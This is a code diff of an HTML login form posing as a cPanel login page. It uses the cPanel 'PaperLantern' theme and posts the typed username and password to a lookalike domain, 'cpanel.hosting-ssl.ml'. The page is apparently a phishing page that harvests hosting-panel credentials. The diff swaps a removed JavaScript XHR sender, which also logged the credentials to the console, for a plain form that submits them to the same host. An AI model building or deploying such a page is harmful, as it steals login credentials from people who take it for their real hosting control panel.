@@ -1,54 +1,6 @@
 <form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post">
-	<p><span>Username: </span><input type="text" id="uname" placeholder="username"></p>
-	<p><span>Password: </span><input type="password" id="passwd" placeholder="password"></p>
-	<input type="hidden" id="submit" value="Login">
+	<p><span>Username: </span><input type="text" name="uname" placeholder="username"></p>
+	<p><span>Password: </span><input type="password" name="passwd" placeholder="password"></p>
+	<input type="hidden" name="submit" value="Login">
+	<input type="submit" value="Login">
 </form>
-<button onclick="SendForm()">Login</button>
-<script>
-Object.prototype.toFormurl = function() {
-	var json = undefined;
-	if (typeof this == "object") {
-		json = this;
-	}
-	var urlparams = "";
-	if (json != undefined) {
-		for (var i in json) {
-			if (json.hasOwnProperty(i)) {
-				var key = i;
-				var value = json[i];
-				urlparams = urlparams + key + "=" + value + "&";
-			}
-		}
-		urlparams = urlparams.slice(0, -1);
-	}
-	return urlparams;
-}
-function SendPost(a,b,c) {
-	var http = new XMLHttpRequest();
-	var url = a;
-	var params = b;
-	http.open('POST', url, true);
-	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-	http.onreadystatechange = function() {
-		if(http.readyState == 4 && http.status == 200) {
-			c(http.responseText);
-		}
-	}
-	http.send(params);
-}
-function getid(a) {
-	return document.getElementById(a);
-}
-function SendForm() {
-	var form = {};
-	form.uname = getid("uname").value;
-	form.passwd = getid("passwd").value;
-	form.theme = "PaperLantern";
-	form.language = "English";
-	console.log(form);
-	
-	var url = getid("LoginForm").getAttribute("action");
-	var data = form.toFormurl();
-	SendPost(url,data,console.log);
-}
-</script>
